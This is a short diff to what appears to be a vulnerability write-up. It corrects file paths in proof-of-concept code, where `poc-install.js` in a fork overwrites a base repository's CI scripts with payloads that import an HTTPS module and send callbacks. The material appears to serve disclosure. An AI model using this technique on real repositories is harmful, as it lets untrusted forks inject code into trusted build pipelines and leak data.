@@ -50,7 +50,7 @@ Add a new file `poc-install.js` to the fork:
 const fs = require('fs');
 const path = require('path');
 
-const victim = path.resolve(process.cwd(), '..', 'base', '.github', 'scripts', 'phase2-analyze.mjs');
+const victim = path.resolve(process.cwd(), '..', 'base', 'scripts', 'phase2-analyze.mjs');
 
 const payload = `
 import https from 'node:https';
@@ -96,7 +96,7 @@ Same shape as Variant B, but overwrite both base scripts. Each callback arrives 
 const fs = require('fs');
 const path = require('path');
 
-const basePath = path.resolve(process.cwd(), '..', 'base', '.github', 'scripts');
+const basePath = path.resolve(process.cwd(), '..', 'base', 'scripts');
 
 const makePayload = (phase) => `
 import https from 'node:https';
